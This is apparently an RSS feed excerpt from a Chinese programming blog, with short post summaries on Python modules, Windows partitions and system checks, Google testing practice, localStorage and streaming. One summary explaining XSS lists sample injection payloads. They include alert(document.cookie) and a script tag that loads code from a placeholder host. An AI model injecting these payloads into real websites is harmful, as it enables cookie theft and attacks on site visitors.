import hashlib if __name__ == &amp;#34;__main__&amp;#34;: s = hashlib.sha256() # Get the hash algorithm. s.update(&amp;#34;jiangwei&amp;#34;) # Hash the data. b = s.hexdigest() # Get he hash value. print b &amp;gt;&amp;gt;&amp;gt;36d6824c3942c1ec34d1b5cc2f5cbe3d2c4110223bce905ddafe0592723411f0 # 它的长度是64，每个字符4位，所以总计是256位。 &amp;gt;&amp;gt;&amp;gt;s = hashlib.sha512() # Get the hash algorithm. &amp;gt;&amp;gt;&amp;gt;3ee15fe269635e2c05d7e965d97d82b95fefcdf7f937cb14e117d235a440b9e173d90f3c669a5dce21d6b8a20ff2376172d171d0c9d9b1f2670d39aefaab7a10 # 可以得到512位的摘要 </description>
    </item>
    
    <item>
      <title>Windows(4)——系统安装时的 esp 和 msr 分区</title>
      <link>https://ac-lm.github.io/posts/windows10/windows4%E7%B3%BB%E7%BB%9F%E5%AE%89%E8%A3%85%E6%97%B6%E7%9A%84-esp-%E5%92%8C-msr-%E5%88%86%E5%8C%BA/</link>
      <pubDate>Wed, 31 Mar 2021 00:00:00 +0000</pubDate>
      
      <guid>https://ac-lm.github.io/posts/windows10/windows4%E7%B3%BB%E7%BB%9F%E5%AE%89%E8%A3%85%E6%97%B6%E7%9A%84-esp-%E5%92%8C-msr-%E5%88%86%E5%8C%BA/</guid>
      <description>硬盘在安装系统前需要进行格式化和分区，而两个分区必须分配在最开始
1.esp 即 EFI 系统分区  esp 全称 EFI system partition，EFI 系统引导。支持 EFI 模式的电脑需要从 ESP 启动系统，EFI 固件可从 ESP 加载 EFI 启动程序和应用程序。 esp 是一个 FAT16 或 FAT32 格式的物理分区，其分区标识是EF（十六进制）而非常规的 0E 或 0C，因此，该分区在 Windows 操作系统下一般是不可见的。 esp 是一个独立于操作系统之外的分区，操作系统被引导之后，就不再依赖它。这使得 esp 非常适合用来存储那些系统级的维护性的工具和数据，比如：引导管理程序、驱动程序、系统维护工具、系统备份等，甚至可以在 esp 里安装一个特殊的操作系统。  2.msr是保留分区  msr 分区本身没有做任何工作，是名副其实的保留分区。 windows 不会向 msr 分区建立文件系统或者写数据，这是为了调整分区结构而保留的分区，msr 分区本质上就是写在分区表上面的“未分配空间”。 msr 分区的用途是防止将一块 GPT 磁盘接到老系统中，被当作未格式化的空硬盘而继续操作（例如重新格式化）导致的数据丢失。GPT 磁盘上有了这个分区，当把它接入 XP 等老系统中，会提示无法识别的磁盘，也无法进一步操作。  </description>
    </item>
    
    <item>
      <title>BUG(16)——xlrd 模块无法打开 .xlsx 文件</title>
      <link>https://ac-lm.github.io/posts/bug/bug16xlrd-%E6%A8%A1%E5%9D%97%E6%97%A0%E6%B3%95%E6%89%93%E5%BC%80-.xlsx-%E6%96%87%E4%BB%B6/</link>
      <pubDate>Tue, 30 Mar 2021 00:00:00 +0000</pubDate>
      
      <guid>https://ac-lm.github.io/posts/bug/bug16xlrd-%E6%A8%A1%E5%9D%97%E6%97%A0%E6%B3%95%E6%89%93%E5%BC%80-.xlsx-%E6%96%87%E4%BB%B6/</guid>
      <description>BUG 描述 xlrd 模块更新后，无法打开 .xlsx 文件，报错 xlrd.biffh.XLRDError: Excel xlsx file；not supported
Resolution xlrd 在更新到了2.0.1版本后只支持 .xls 文件，若要打开 .xlsx 文件需要安装旧版 xlrd，执行
pip uninstall xlrd pip install xlrd==1.2.0 </description>
    </item>
    
    <item>
      <title>Google软件测试之道(1)</title>
      <link>https://ac-lm.github.io/posts/google%E8%BD%AF%E4%BB%B6%E6%B5%8B%E8%AF%95%E4%B9%8B%E9%81%93/google%E8%BD%AF%E4%BB%B6%E6%B5%8B%E8%AF%95%E4%B9%8B%E9%81%931/</link>
      <pubDate>Tue, 30 Mar 2021 00:00:00 +0000</pubDate>
      
      <guid>https://ac-lm.github.io/posts/google%E8%BD%AF%E4%BB%B6%E6%B5%8B%E8%AF%95%E4%B9%8B%E9%81%93/google%E8%BD%AF%E4%BB%B6%E6%B5%8B%E8%AF%95%E4%B9%8B%E9%81%931/</guid>
      <description>参考原文：Google软件测试之道 @Whittaker Arb 
 质量不等于测试 Google是一家以创新和速度为基础的公司，快速地发布代码，迭代地增加功能，这是Google常做的。在这样的环境下，测试不得不变的异常灵活，并且在技能上要做许多前期的规划，仅仅只是简单维护并不能真正解决问题。有时，测试和开发互相交织在一起，达到了无法区分彼此的程度，而在另外一些时候，测试和开发又是完全分离，甚至开发人员都不知道测试在做些什么。
在Google，写代码的开发人员也承担了质量的重任。质量从来就不仅仅是一些测试的问题。在Google，每个写代码的开发者本身就是测试者，质量在名义上也由这样的开发测试组合共同承担。在Google，谈论开发测试比（译注：这里指在人员数量上，开发和测试的比率）就像讨论太阳表面的空气质量一样，这本身没有任何意义。如果你是一名工程师，那么你同时也是一名测试人员。如果在你的职位头衔上有测试的字样，你的任务就是怎样使那些头衔上没有测试的人可以更好地去做测试。
质量不是被测试出来的——这句看似陈词滥调的话却包含着一定的道理。从汽车行业到软件行业，如果在最开始设计创建的时候就是错的，那它永远不会变成正确的。试问一下汽车行业的公司，大量召回事实上有质量问题的产品，代价是多么的昂贵。因此，从最初的创建阶段就要做正确，否则将会陷入混乱的万劫深渊。然而，这句话也并不像听起来那样的简单和准确。虽然质量不是被测出来的，但同样有证据可以表明，未经测试也不可能开发出有质量的软件。如果连测试都没有做，如何保证你的软件具有很高的质量呢？
有一个简单的办法可以解决这个难题，那就是停止开发与测试的隔离对立。开发和测试应该并肩齐趋。你的每一段代码写完后都要立刻测试这段代码，当完成了更多的代码时就做更多的测试。测试不是独立隔离的活动，它本身就是开发过程的一部分。质量不等于测试，当你把开发过程和测试放到一起，就像在搅拌机里混合搅拌那样，直到不能区分彼此的时候，你就得到了质量。
在Google，这正是我们的目标，就是把开发过程和测试融合在一起——开发和测试必须同时开展。写一段代码就立刻测试这段代码，完成更多的代码就做更多的测试，但这里的关键是由谁来做这些测试呢？众所周知，在Google，专职测试人员的数量非常稀少，与开发相比根本不成比例，唯一可能的去做这些的就只能是开发人员。还有谁能比实际写代码的人更适合做测试呢？还有谁能比实际写代码的人更适合去寻找bug呢？是谁会为了避免受更大刺激而去想办法避免产生bug呢？Google能用如此少的专职测试人员的原因，就是开发对质量的负责。如果某个产品出了问题，第一个跳出来的肯定是导致这个问题发生的开发人员，而不是遗漏这个bug的测试人员。
这意味着质量更像是一种预防行为，而不是检测。质量是开发过程的问题，而不是测试问题。我们已经成功地将测试实践融入为开发过程的一部分，并创建了一个增量上线的流程。如果一些项目在线上被证实的确是bug重重，它将会被回滚到之前的版本。在确保不出现回滚级别bug发生的前提下，预防了许多客户问题的同时，也很大程度降低了专职测试人员的数量。在Google，测试的目标就是来判断这种预防工作做的怎么样。
软件开发工程师（SWE） 软件开发工程师（译注：software engineer，后文简称SWE）是一个传统上的开发角色，他们的工作是实现最终用户使用的功能代码。他们创建设计文档、选择最优的数据结构和整体架构，并且花费大量时间在代码实现与代码审查上。SWE需要编写与测试代码，包括测试驱动的设计、单元测试、参与构建各种规模的测试等，这些测试会在本章的后面做详细解释。SWE会对他们编写、修复以及修改的代码承担质量责任。如果一个开发者不得不修改一个函数，或者这次修改导致已有测试用例运行失败，或者需要增加一个新的测试用例，他就必须去实现这个测试用例的代码。开发工程师几乎将所有的时间都花费在了代码编写上。
软件测试开发工程师（SET） 软件测试开发工程师（译注：software engineer in test，后文简称SET）也是一个开发角色，只是工作重心在可测试性和通用测试基础框架上。他们参与设计评审，非常近距离地观察代码质量与风险。为了增加可测试性，他们甚至会对代码进行重构，并编写单元测试框架和自动化测试框架。SET是SWE在代码库上的合作伙伴，相比较SWE是在增加功能性代码或是提高性能的代码，SET更加关注于质量提升和测试覆盖率的增加。SET同样会花费近百分之百的时间在编写代码上，他们这样做的目的是为质量服务，而SWE则更关注在客户使用功能开发的实现上。
测试工程师（TE） 测试工程师（译注：test engineer，后文简称TE）是一个和SET关系密切的角色，有自己不同的关注点&amp;ndash;把用户放在第一位来思考，代表用户的利益。一些Google的TE会花费大量时间在模拟用户的使用场景和自动化脚本或代码上。同时，他们会把开发工程师和SET编写的测试分门别类地组织起来，分析、解释、测试运行结果，驱动测试执行，特别是在项目的最后阶段，推进产品发布。TE是真正的产品专家、质量顾问和风险分析师。某些TE需要编写大量的代码，而另外一些TE则只用编写少量的代码。
组织架构 在多数组织中，开发人员和测试人员都一起隶属于同一个工程产品团队。从组织架构上讲，开发人员和测试人员汇报给同一个产品团队的管理者。这样看起来，同一个产品、同一个团队、所有参与的人都在一起，应该可以做到平等相处、患难与共。但不幸的是，我还从来没见过有团队能真正做到这样。资深管理者一般都是产品经理或开发经理，而不是来自于测试团队。在产品发布时，优先考虑的是功能是否完整和易用性方面是否足够简单，却很少考虑质量问题。作为同一个团队，测试总是在为开发让路。为何我们这个行业里总是充斥着各种有缺陷的、早产的产品，或许这就是问题所在。不行就再发布一个补丁包。
Google的组织汇报架构被划分为不同的专注领域（Focus Areas）。这些专注领域包括客户端（Chrome、Google工具栏等）、地理（地图、Google Earth等）、广告、Apps、移动，等等。所有的开发工程师汇报给这些专注领域的管理者、总监或副总裁。
但SET和TE并没有遵循这个模式。测试是独立存在的部门，是与专注领域部门平行的部门（横跨各个产品专注领域），我们称之为工程生产力团队。测试人员基本上以租借的方式进入到产品团队，去做提高质量相关的事情，寻找一些测试不足的地方，或者公开一些不可接受的缺陷率数据。由于测试人员并不是直接向产品团队进行汇报，因此我们并不是简单地被告之某个项目急需发布就可以通过测试。我们有自己选择决定的优先级，在可靠性、安全性等问题上都不会妥协，除非碰到更重要的事情。如果开发团队想要我们在测试上放他们一马，他们必须事先和我们协商，但一般情况下都会被拒绝。
这样的组织结构也可以帮助我们保持数量较少的测试人员。一个产品团队不能任意降低测试人员招聘的技术要求，从而雇佣更多的测试人员，然后再让他们做一些简单和琐碎的脏活累活。这些功能相关的脏活累活本应是开发人员的工作，不能简单地扔给倒霉的测试人员。工程生产力团队会根据不同产品团队的优先级、复杂度和其他产品的实际比较后，再来分配测试人员。显然，有时候我们可能搞错，实际上也确实出过错，但总体上来说，这样会保持实际的需求与不明确的需求之间的某种平衡。
这种测试人员在不同项目之间的借调模式，可以让SET和TE时刻保持新鲜感并且总是很忙碌，另外还能保证一个好的测试想法可以快速在公司内部蔓延。一个在Geo产品上运用很好的测试技术或工具，很有可能在Chrome产品中也得到使用。推广测试技术方面创新的最佳方式，莫过于把这个创新的发明者直接借调过来。
在Google有一个广泛被接受的做法：对于一个测试人员，如果在某个产品中工作满18个月之后，就可以无理由地自愿转岗到其他产品，当然这个转岗并不是强制的。可以想象一个产品失去优秀测试专家而带来的悲痛，但从整个公司的角度来看，需要保持对各个产品与技术都了解的测试人员的存在。Google的测试工程师在客户端、web、浏览器、移动技术等领域都有所涉猎，可以高效地使用不同的语言和平台。由于Google的产品和服务很大程度上有比较强的集成关联关系，测试人员可以很容易地保持相关的专业技能，并在公司范围内的产品之间自由穿梭。</description>
    </item>
    
    <item>
      <title>Windows(3)——执行系统自检</title>
      <link>https://ac-lm.github.io/posts/windows10/windows3%E6%89%A7%E8%A1%8C%E7%B3%BB%E7%BB%9F%E8%87%AA%E6%A3%80/</link>
      <pubDate>Tue, 30 Mar 2021 00:00:00 +0000</pubDate>
      
      <guid>https://ac-lm.github.io/posts/windows10/windows3%E6%89%A7%E8%A1%8C%E7%B3%BB%E7%BB%9F%E8%87%AA%E6%A3%80/</guid>
      <description>如何实现 # 系统自检命令 sfc /SCANNOW # 扫描系统文件并和官方服务器上文件进行对比，查找是否存在系统文件和官方不一致的情况 Dism /Online /Cleanup-Image /ScanHealth # 联网下载与官方不同的系统文件进行替换 Dism /Online /Cleanup-Image /CheckHealth # 将系统中和官方不同的系统文件直接还原成源文件 DISM /Online /Cleanup-image /RestoreHealth </description>
    </item>
    
    <item>
      <title>随记(23)——XSS攻击</title>
      <link>https://ac-lm.github.io/posts/%E9%9A%8F%E8%AE%B0/%E9%9A%8F%E8%AE%B023xss-%E6%94%BB%E5%87%BB/</link>
      <pubDate>Tue, 30 Mar 2021 00:00:00 +0000</pubDate>
      
      <guid>https://ac-lm.github.io/posts/%E9%9A%8F%E8%AE%B0/%E9%9A%8F%E8%AE%B023xss-%E6%94%BB%E5%87%BB/</guid>
      <description>参考原文：XSS(跨站脚本攻击)详解 @615 
 1.简单介绍 HTML注入与XSS攻击简单来说就是当用户在输入框输入内容，后台对输入内容不做处理直接添加入页面。此时，用户就可以刻意填写HTML、JavaScript脚本来作为文本输入，这样这个页面就会出现一些用户加入的东西了，这是一种脚本注入。
&amp;lt;a href=http://www.baidu.com&amp;gt;Click Me&amp;lt;/a&amp;gt; 当然有些稍微有点脑子的网站会屏蔽 script 标签的输入，但是我们大可以利用类似于以下的语句注入脚本。
&amp;lt;img src=1 οnerrοr=alert(1) /&amp;gt; &amp;lt;scr&amp;lt;script&amp;gt;ipt&amp;gt; 因此，相比起过滤script标签，建议采用更加高明的过滤&#39;&amp;lt;&#39;&#39;&amp;gt;&#39;&#39;&amp;amp;&amp;lsquo;等符号。事实上html定义了几个特定符号专门用来表示这几个符号的，比如用&amp;amp;amp来代替&amp;amp;符号等。
2.XSS 跨站脚本攻击XSS(Cross Site Scripting)，为了不和层叠样式表(Cascading Style Sheets, CSS)的缩写混淆，故将跨站脚本攻击缩写为XSS。恶意攻击者往Web页面里插入恶意Script代码，当用户浏览该页面时，嵌入Web里面的Script代码会被执行，从而达到恶意攻击用户的目的。XSS攻击针对的是用户层面的攻击！
XSS攻击主要分为以下三种
 存储型XSS：存储型XSS，持久化，代码是存储在服务器中的，如在个人信息或发表文章等地方，插入代码，如果没有过滤或过滤不严，那么这些代码将储存到服务器中，用户访问该页面的时候触发代码执行。这种XSS比较危险，容易造成蠕虫，盗窃cookie 反射型XSS：非持久化，需要欺骗用户自己去点击链接才能触发XSS代码（服务器中没有这样的页面和内容），一般容易出现在搜索页面。反射型XSS大多数是用来盗取用户的Cookie信息 DOM型XSS：不经过后端，DOM-XSS漏洞是基于文档对象模型(Document Objeet Model,DOM)的一种漏洞，DOM-XSS是通过url传入参数去控制触发的，其实也属于反射型XSS。可能触发DOM型XSS的属性有：document.referer，window.name，location，innerHTML，documen.write。具体操作是在URL中传入参数的值，然后客户端页面通过js脚本利用DOM的方法获得URL中参数的值，再通过DOM方法进行赋值或其他操作  3.XSS的攻击载荷 以下所有标签的 &amp;gt; 都可以用 // 代替
script标签 &amp;lt;script&amp;gt;alert(&amp;#34;hack&amp;#34;)&amp;lt;/script&amp;gt; #弹出hack &amp;lt;script&amp;gt;alert(/hack/)&amp;lt;/script&amp;gt; #弹出hack &amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt; #弹出1，对于数字可以不用引号 &amp;lt;script&amp;gt;alert(document.cookie)&amp;lt;/script&amp;gt; #弹出cookie &amp;lt;script src=http://xxx.com/xss.js&amp;gt;&amp;lt;/script&amp;gt; #引用外部的xss svg标签 &amp;lt;svg onload=&amp;#34;alert(1)&amp;#34;&amp;gt; &amp;lt;svg onload=&amp;#34;alert(1)&amp;#34;// img标签 &amp;lt;img src=1 οnerrοr=alert(&amp;#34;hack&amp;#34;)&amp;gt; &amp;lt;img src=1 οnerrοr=alert(document.cookie)&amp;gt; #弹出cookie body标签 &amp;lt;body οnlοad=alert(1)&amp;gt; &amp;lt;body οnpageshοw=alert(1)&amp;gt; video标签 &amp;lt;video οnlοadstart=alert(1) src=&amp;#34;/media/hack-the-planet.</description>
    </item>
    
    <item>
      <title>Python(27)——random 模块</title>
      <link>https://ac-lm.github.io/posts/python/python27random-%E6%A8%A1%E5%9D%97/</link>
      <pubDate>Mon, 29 Mar 2021 00:00:00 +0000</pubDate>
      
      <guid>https://ac-lm.github.io/posts/python/python27random-%E6%A8%A1%E5%9D%97/</guid>
      <description>1.random.randrange(a, b, c) 返回给定范围 [a, b) 内的随机整数，不包括b，第三个参数为步长，只能返回该范围内特定的数，比如该例子中[1,4,7,…,97]
&amp;gt;&amp;gt;&amp;gt; random.randrange(1,100)68&amp;gt;&amp;gt;&amp;gt; random.randrange(1,100,3)162.random.randint(a, b) 返回 [1,100] 范围内的随机数整数，包括100，第三个参数同random.randrange()用法一样
&amp;gt;&amp;gt;&amp;gt; random.randint(1,100)173.random.random() 返回 [0, 1) 范围内随机浮点数，不包括1
&amp;gt;&amp;gt;&amp;gt; random.random()0.413857232395242974.random.choice() 在给定容器中随机选择一个元素
rand = [&#39;0&#39;, &#39;1&#39;, &#39;2&#39;, &#39;3&#39;, &#39;4&#39;]temp = choice(rand)5.random.sample(a) 在给定容器中随记选择特定数量元素
&amp;gt;&amp;gt;&amp;gt; random.sample(&amp;quot;abcde&amp;quot;,2)[&#39;e&#39;, &#39;b&#39;] 6.random.shuffle() 随机打乱传入的容器(容器必须是可变对象)
&amp;gt;&amp;gt;&amp;gt; l = [1,2,3,4]&amp;gt;&amp;gt;&amp;gt; random.shuffle(l)&amp;gt;&amp;gt;&amp;gt; l[1, 3, 2, 4]</description>
    </item>
    
    <item>
      <title>随记(22)——视频推流与拉流</title>
      <link>https://ac-lm.github.io/posts/%E9%9A%8F%E8%AE%B0/%E9%9A%8F%E8%AE%B022%E8%A7%86%E9%A2%91%E6%8E%A8%E6%B5%81%E4%B8%8E%E6%8B%89%E6%B5%81/</link>
      <pubDate>Mon, 29 Mar 2021 00:00:00 +0000</pubDate>
      
      <guid>https://ac-lm.github.io/posts/%E9%9A%8F%E8%AE%B0/%E9%9A%8F%E8%AE%B022%E8%A7%86%E9%A2%91%E6%8E%A8%E6%B5%81%E4%B8%8E%E6%8B%89%E6%B5%81/</guid>
      <description>参考原文：视频推流与拉流 
 1.推流 推流，指的是把采集阶段封包好的内容传输到服务器的过程。主流的推送协议和优缺点如下
 RTMP：Real Time Messaging Protocol（实时消息传输协议），是Adobe公司为Flash/AIR平台和服务器之间音、视频及数据传输开发的实时消息传送协议。RTMP协议基于TCP，包括RTMP基本协议及RTMPT/RTMPS/RTMPE等多种变种。RTMP协议中，视频必须是H264编码，音频必须是AAC或MP3编码，且多以flv格式封包。RTMP是目前最主流的流媒体传输协议，对CDN支持良好，实现难度较低，是大多数的直播平台的选择。不过RTMP有着一个最大的不足——不支持浏览器，且Adobe已不再更新。因此直播服务要支持浏览器的话，需要另外的推送协议支持。 HLS：Http Live Streaming是由Apple公司定义的基于HTTP的流媒体实时传输协议。它的原理是将整个流分为多个小的文件来下载，每次只下载若干个。服务器端会将最新的直播数据生成新的小文件，客户端只要不停的按顺序播放从服务器获取到的文件，就实现了直播。基本上，HLS是以点播的技术实现了直播的体验。因为每个小文件的时长很短，客户端可以很快地切换码率，以适应不同带宽条件下的播放。分段推送的技术特点，决定了HLS的延迟一般会高于普通的流媒体直播协议。传输内容包括两部分：一是M3U8描述文件，二是TS媒体文件。TS媒体文件中的视频必须是H264编码，音频必须是AAC或MP3编码。由于数据通过HTTP协议传输，所以完全不用考虑防火墙或者代理的问题，而且分段文件的时长很短。 WebRTC：Web Real-Time Communication，即“源自网页即时通信”。WebRTC是一个支持浏览器进行实时语音、视频对话的开源协议。WebRTC的支持者甚多，Google、Mozilla、Opera推动其成为W3C推荐标准。WebRTC支持目前的主流浏览器，并且基于SRTP和UDP，即便在网络信号一般的情况下也具备较好的稳定性。此外，WebRTC可以实现点对点通信，通信双方延时低，此外，WebRTC可以实现点对点通信，通信双方延时低，是实现“连麦”功能比较好的选择。  2.拉流 拉流是指服务器已有直播内容，用指定地址进行拉取的过程，即推流是直播端，拉流是客户端</description>
    </item>
    
    <item>
      <title>Python(26)——深复制与浅复制</title>
      <link>https://ac-lm.github.io/posts/python/python26%E6%B7%B1%E5%A4%8D%E5%88%B6%E4%B8%8E%E6%B5%85%E5%A4%8D%E5%88%B6/</link>
      <pubDate>Sun, 28 Mar 2021 00:00:00 +0000</pubDate>
      
      <guid>https://ac-lm.github.io/posts/python/python26%E6%B7%B1%E5%A4%8D%E5%88%B6%E4%B8%8E%E6%B5%85%E5%A4%8D%E5%88%B6/</guid>
      <description>参考原文：图解Python深拷贝和浅拷贝 @田小计划 
 1.对象赋值 will = [&amp;#34;Will&amp;#34;, 28, [&amp;#34;Python&amp;#34;, &amp;#34;C#&amp;#34;, &amp;#34;JavaScript&amp;#34;]] wilber = will print id(will) print will print [id(ele) for ele in will] print id(wilber) print wilber print [id(ele) for ele in wilber] will[0] = &amp;#34;Wilber&amp;#34; will[2].append(&amp;#34;CSS&amp;#34;) print id(will) print will print [id(ele) for ele in will] print id(wilber) print wilber print [id(ele) for ele in wilber] 代码分析  首先，创建了一个名为will的变量，这个变量指向一个list对象，从第一张图中可以看到所有对象的地址（每次运行，结果可能不同） 然后，通过will变量对wilber变量进行赋值，那么wilber变量将指向will变量对应的对象（内存地址），也就是说&amp;quot;wilber is will&amp;quot;，&amp;ldquo;wilber[i] is will[i]&amp;quot;，可以理解为，Python中，对象的赋值都是进行对象引用（内存地址）传递 第三张图中，由于will和wilber指向同一个对象，所以对will的任何修改都会体现在wilber上，这里需要注意的一点是，str是不可变类型，所以当修改的时候会替换旧的对象，产生一个新的地址39758496  2.</description>
    </item>
    
    <item>
      <title>Python(25)——切片</title>
      <link>https://ac-lm.github.io/posts/python/python25%E5%88%87%E7%89%87/</link>
      <pubDate>Sat, 27 Mar 2021 00:00:00 +0000</pubDate>
      
      <guid>https://ac-lm.github.io/posts/python/python25%E5%88%87%E7%89%87/</guid>
      <description>参考原文：彻底搞懂Python切片操作 @马尔代夫Maldives 
 利用python解决问题的过程中，经常会遇到从某个对象中抽取部分值的情况。“切片”操作正是专门用于实现这一目标的有力武器。理论上，只要条件表达式得当，可以通过单次或多次切片操作实现任意目标值切取。切片操作的基本语法比较简单，但如果不彻底搞清楚内在逻辑，也极容易产生错误，而且这种错误有时隐蔽得较深，难以察觉。本文通过详细例子总结归纳了切片操作的各种情形，下文均以list类型作为实验对象，其结论可推广至其他可切片对象。
1. 索引方式 包括：正索引和负索引两部分，如下图所示，以list对象 a = [0, 1, 2, 3, 4, 5, 6, 7, 8, 9] 为例：
2.操作的一般方式 一个完整的切片表达式包含两个&amp;quot; : &amp;ldquo;，用于分隔三个参数(start_index、end_index、step)。当只有一个&amp;rdquo; : &amp;ldquo;时，默认第三个参数step=1；当一个&amp;rdquo; : &amp;ldquo;也没有时，start_index=end_index，表示切取start_index指定的那个元素。
object[start_index:end_index:step]  step：正负数均可，其绝对值大小决定了切取数据时的‘‘步长”，而正负号决定了“切取方向”，正表示“从左往右”取值，负表示“从右往左”取值。当step省略时，默认为1，即从左往右以步长1取值。 start_index：表示起始索引（包含该索引对应值）；该参数省略时，表示从对象“端点”开始取值，至于是从“起点”还是从“终点”开始，则由step参数的正负决定，step为正从“起点”开始，为负从“终点”开始。 end_index：表示终止索引（不包含该索引对应值）；该参数省略时，表示一直取到数据“端点”，至于是到“起点”还是到“终点”，同样由step参数的正负决定，step为正时直到“终点”，为负时直到“起点”。  3.举例 a = [0, 1, 2, 3, 4, 5, 6, 7, 8, 9] a. 切取单个元素 &amp;gt;&amp;gt;&amp;gt;a[0] &amp;gt;&amp;gt;&amp;gt;0 &amp;gt;&amp;gt;&amp;gt;a[-4] &amp;gt;&amp;gt;&amp;gt;6 当索引只有一个数时，表示切取某一个元素。 b. 切取完整对象 &amp;gt;&amp;gt;&amp;gt;a[:] #从左往右 &amp;gt;&amp;gt;&amp;gt; [0, 1, 2, 3, 4, 5, 6, 7, 8, 9] &amp;gt;&amp;gt;&amp;gt;a[::]#从左往右 &amp;gt;&amp;gt;&amp;gt; [0, 1, 2, 3, 4, 5, 6, 7, 8, 9] &amp;gt;&amp;gt;&amp;gt;a[::-1]#从右往左 &amp;gt;&amp;gt;&amp;gt; [9, 8, 7, 6, 5, 4, 3, 2, 1, 0] c.</description>
    </item>
    
    <item>
      <title>Python(24)——获取 input 输入的文本值</title>
      <link>https://ac-lm.github.io/posts/python/python24%E8%8E%B7%E5%8F%96-input-%E8%BE%93%E5%85%A5%E7%9A%84%E6%96%87%E6%9C%AC%E5%80%BC/</link>
      <pubDate>Fri, 26 Mar 2021 00:00:00 +0000</pubDate>
      
      <guid>https://ac-lm.github.io/posts/python/python24%E8%8E%B7%E5%8F%96-input-%E8%BE%93%E5%85%A5%E7%9A%84%E6%96%87%E6%9C%AC%E5%80%BC/</guid>
      <description>1.get_attribute(‘value’)获取输入的文本值 inputContext1 = driver.find_element_by_xpath(&amp;#39;//input&amp;#39;).get_attribute(&amp;#39;value&amp;#39;) 2.通过执行JS操作来获取输入的文本值 inputContext2 = &amp;#34;return document.getElementsByClassName(&amp;#39;ivu-input&amp;#39;)[0].value&amp;#34; driver.execute_script(inputContext2) 3.get_attribute(‘textContent’)获取元素的文本值 logoContext1 = driver.find_element_by_xpath(&amp;#39;//div[@class=&amp;#34;logo&amp;#34;]/span&amp;#39;).get_attribute(&amp;#39;textContent&amp;#39;) 4.通过text来获取文本值 logoContext2 = driver.find_element_by_xpath(&amp;#39;//div[@class=&amp;#34;logo&amp;#34;]/span&amp;#39;).text 5.通过执行JS操作来获取输入的文本值 logoContext3 = &amp;#34;return document.getElementsByTagName(&amp;#39;span&amp;#39;)[0].innerText&amp;#34; </description>
    </item>
    
    <item>
      <title>随记(21)——什么是localStorage</title>
      <link>https://ac-lm.github.io/posts/%E9%9A%8F%E8%AE%B0/%E9%9A%8F%E8%AE%B021%E4%BB%80%E4%B9%88%E6%98%AF-localstorage/</link>
      <pubDate>Fri, 26 Mar 2021 00:00:00 +0000</pubDate>
      
      <guid>https://ac-lm.github.io/posts/%E9%9A%8F%E8%AE%B0/%E9%9A%8F%E8%AE%B021%E4%BB%80%E4%B9%88%E6%98%AF-localstorage/</guid>
      <description>1.什么是 localStorage 在HTML5中，新加入了一个localStorage特性，这个特性主要是用来作为本地存储来使用的，解决了cookie存储空间不足的问题(cookie中每条cookie的存储空间为4k)，localStorage中一般浏览器支持的是5M大小，这个在不同的浏览器中localStorage会有所不同。
2.localStorage的优势  localStorage拓展了cookie的4K限制 localStorage会可以将第一次请求的数据直接存储到本地，这个相当于一个5M大小的针对于前端页面的数据库，相比于cookie可以节约带宽，但是这个却是只有在高版本的浏览器中才支持的  3.localStorage的局限  浏览器的大小不统一，并且在IE8以上的IE版本才支持localStorage这个属性 目前所有的浏览器中都会把localStorage的值类型限定为string类型，这个在对我们日常比较常见的JSON对象类型需要一些转换 localStorage在浏览器的隐私模式下面是不可读取的 localStorage本质上是对字符串的读取，如果存储内容多的话会消耗内存空间，会导致页面变卡 localStorage不能被爬虫抓取到 localStorage与sessionStorage的唯一一点区别就是localStorage属于永久性存储，而sessionStorage属于当会话结束的时候，sessionStorage中的键值对会被清空  4.localStorage的使用  localStorage的使用是遵循同源策略的，不同的网站直接是不能共用相同的localStorage localStorage只支持string类型的存储，即使存储进去的是int类型，但是打印出来仍是string类型 localStorage相当于一个前端的数据库，也有增删查改的功能 一般会将JSON存入localStorage中，但是在localStorage会自动将localStorage转换成为字符串形式，这个时候可以使用JSON.stringify()这个方法，来将JSON转换成为JSON字符串。读取之后要将JSON字符串转换成为JSON对象，使用JSON.parse()方法  </description>
    </item>
    
    <item>
      <title>Python(23)——os 模块文件操作</title>
      <link>https://ac-lm.github.io/posts/python/python23os-%E6%A8%A1%E5%9D%97%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C/</link>
      <pubDate>Thu, 25 Mar 2021 00:00:00 +0000</pubDate>
      
      <guid>https://ac-lm.github.io/posts/python/python23os-%E6%A8%A1%E5%9D%97%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C/</guid>
      <description>参考文档：os文档 @Python文档 
 1.os.listdir() os.listdir() 方法用于返回指定的文件夹包含的文件或文件夹的名字的列表。它不包括隐藏文件如（. 或 .. 开头的文件）
import os, sys path = &amp;#34;/var/www/html/&amp;#34; dirs = os.listdir(path) # path -- 需要列出的目录路径 # 返回指定路径下的文件和文件夹列表 for file in dirs: print(file) 2.os.path.exists() os.path.exists() 方法用于判断文件夹是否存在
import os path = &amp;#34;/var/www/html/&amp;#34; # path -- 需要列出的目录路径 if os.path.exists(path): pass 3.os.path.abspath() # 获取当前文件的绝对路径 path1 = os.path.abspath(__file__) print(&amp;#34;path1:{}&amp;#34;.format(path1)) 4.os.path.dirname() # 获取当前文件的目录 path2 = os.path.dirname(__file__) print(&amp;#34;path2:{}&amp;#34;.format(path2)) 5.os.mkdir() os.mkdir() 方法用于创建文件夹
import os path=&amp;#34;/var/www/html/ABC&amp;#34; isExists=os.path.exists(path) if not isExists: os.</description>
    </item>
    
    <item>
      <title>Python(22)——sys 模块</title>
      <link>https://ac-lm.github.io/posts/python/python22sys-%E6%A8%A1%E5%9D%97/</link>
      <pubDate>Wed, 24 Mar 2021 00:00:00 +0000</pubDate>
      
      <guid>https://ac-lm.github.io/posts/python/python22sys-%E6%A8%A1%E5%9D%97/</guid>
      <description>参考原文：Python sys 模块详解 @轩辕御龙 
 1.什么是 sys 模块 “sys”即“system”，即“系统”。sys模块为用户提供了一些接口，用于访问 Python 解释器自身使用和维护的变量，同时模块中还提供了一部分函数，可以与解释器进行比较深度的交互。但需要注意的是sys模块针对的是与Python解释器相关的变量和方法，不是主机操作系统。
2.sys.argv “argv”即“argument value”的简写，其是一个列表对象，存储的是在命令行调用 Python 脚本时提供的“命令行参数”。
这个列表中的第一个参数是被调用的脚本名称，也就是说，调用 Python 解释器的“命令”（python）本身并没有被加入这个列表当中。这个地方要注意一下，因为这一点跟 C 程序的行为有所不同，C 程序读取命令行参数是从头开始的。
举例来说，在当前目录下新建一个 Python 文件 test.py，其内容为：
import sys print(&amp;#34;The list of command line arguments:\n&amp;#34;, sys.argv) 在命令行运行该脚本：
